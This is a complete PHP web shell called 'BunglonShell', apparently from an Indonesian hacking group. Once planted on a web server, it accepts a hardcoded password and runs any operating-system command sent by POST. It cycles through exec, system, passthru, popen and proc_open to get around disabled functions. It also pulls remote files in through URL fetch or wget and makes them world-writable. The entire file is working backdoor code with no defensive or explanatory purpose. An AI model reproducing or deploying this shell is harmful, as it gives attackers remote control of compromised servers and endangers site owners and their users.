<?php
/**
_________                          .__                   
\______   \ __ __   ____     ____  |  |    ____    ____  
 |    |  _/|  |  \ /    \   / ___\ |  |   /  _ \  /    \ 
 |    |   \|  |  /|   |  \ / /_/  >|  |__(  <_> )|   |  \
 |______  /|____/ |___|  / \___  / |____/ \____/ |___|  /
        \/             \/ /_____/ desploits shell     \/ 

 Team 	: Developer Desploits Tool
 Coder 	: x'1n73ct
 Class 	: BunglonShell
**/
//error_reporting(0);
define("INI_GET","ini_get");
define("FUNCTION_EXIST","function_exists");

class BunglonShell
{
	function __construct($post) {
		$this->password = (isset($post['password'])) ? $post['password']: '';
		$this->comand = (isset($post['cmd'])) ? $post['cmd'] : '';
		$this->req_type = (isset($post['type'])) ? $post['type'] : '';
		$this->data['data'] = (isset($post['upl_file'])) ? $post['upl_file'] : '';
		$this->data['filename'] = (isset($post['upl_filename'])) ? $post['upl_filename'] : '';
	}

	protected function is_login()
	{
		return ($this->password == 'bunglon') ? 1 : 0;
	}

	protected function run($comand='')
    {
        $res = '';
        $cmd = (empty($comand)) ? $this->comand : $comand;
        if (!empty($cmd)) {
            if ($this->_fexit('exec')) {
                exec($cmd, $res);
                $res = join("\n", $res);
            } elseif ($this->_fexit('shell_exec')) {
                $res = @shell_exec($cmd);
            } elseif ($this->_fexit('system')) {
                @ob_start();
                system($cmd);
                $res = ob_get_contents();
                @ob_end_clean();
            } elseif ($this->_fexit('passthru')) {
                @ob_start();
                passthru($cmd);
                $res = ob_get_contents();
                @ob_end_clean();
            } elseif (@is_resource($f = @popen($cmd, "r"))) {
                $res = "";
                if ($this->_fexit('fread') && $this->_fexit('feof')) {
                    while (!@feof($f)) {
                        $res .= @fread($f, 1024);
                    }
                } else if ($this->_fexit('fgets') && $this->_fexit('feof')) {
                    while (!@feof($f)) {
                        $res .= @fgets($f, 1024);
                    }
                }
                @pclose($f);
            } elseif (@is_resource($f = @proc_open($cmd, array(1 => array("pipe", "w")), $pipes))) {
                $res = "";
                if ($this->_fexit('fread') && $this->_fexit('feof')) {
                    while (!@feof($pipes[1])) {
                        $res .= @fread($pipes[1], 1024);
                    }
                } else if ($this->_fexit('fgets') && $this->_fexit('feof')) {
                    while (!@feof($pipes[1])) {
                        $res .= @fgets($pipes[1], 1024);
                    }
                }
                @proc_close($f);
            }
        }
        return $res;
    }

    protected function _fexit($func) 
    {
    	if ($this->_check(INI_GET,'safe_mode')) return false;
    	$disabled = $this->_check(INI_GET,'disable_functions');
    	if ($disabled) {
        	$disabled = array_map('trim', explode(',', $disabled));
        	return !in_array($func, $disabled);
    	}
    	return true;
	}

	protected function _isUrl($url)
	{
		$array = get_headers($url);
		$string = $array[0];
			if(strpos($string,"200")){
				return true;
			}else{
				return false;
		}
	}

	protected function Get($url)
	{
		if($this->_check(INI_GET,"allow_url_fopen") == 1){
			return file_get_contents($url);
		}elseif($this->_check(FUNCTION_EXIST,"curl_version")){
			$ch = curl_init();  
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); 
                        $output=curl_exec($ch);
 			curl_close($ch);
    		return $output;
		}
	}

	protected function _PutFile($data,$filename)
	{
		$create_file_1 = file_put_contents($filename, $data);
		if(!file_exists($filename)){
			@fwrite(fopen($filename, 'w'),$data);
		}else{
			chmod($filename,"0777");
		}

		return (file_exists($filename)) ? 1 : 0;
	}

	protected function _check($func,$val)
	{
		return call_user_func($func,$val);
	}

	protected function FncCheck(){
		$curl = ($this->_check(FUNCTION_EXIST,"curl_version")) ? "ON" : "OFF" ;
		$all = ($this->_check(INI_GET,"allow_url_fopen")) ? "ON" : "OFF" ;
		$check_py = ($this->run("python -h")) ? "ON" : "OFF";
		$check_pl = ($this->run("perl -h")) ? "ON" : "OFF";
		$function = array(
			'curl' => $curl,
			'allow_url_fopen' => $all,
			'python' => $check_py,
			'perl' => $check_pl
			);
		return $function;

	}

	protected function Upl_data($req)
	{
		if($this->_isUrl($req['data'])){
			$url = $this->Get($req['data']);
			$this->_PutFile($url,$req['filename']);
		}else{
			$data = base64_decode($req['data']);
			if(!$this->_PutFile($data,$req['filename'])){
				if(!file_exists($req['filename']) && $this->_fexit('system')){
					$this->run("wget {$data} -O {$req['filename']}");
				}
			}
		}
		if(file_exists($req['filename'])){
			return "File {$req['filename']} Sudah terupload\n";
		}else{
			return "File {$req['filename']} Gagal terupload\n";
		}

		
	}

	public function execute()
	{
		if($this->req_type == 'is_login'){
		echo ($this->is_login()) ? "in" : "out";
		}elseif ($this->req_type == "upl_data") {
			echo $this->Upl_data($this->data);
		}elseif($this->req_type == "cmd"){
			if($this->comand == "sysinfo"){
				foreach ($this->FncCheck() as $key => $val) {
					echo "[".$val."]"." ".$key."\n";
				}
			}else{
			echo $this->run()."\r\n";
			}
		}
		
	}


}

$BunglonShell = new BunglonShell($_POST);
$BunglonShell->execute();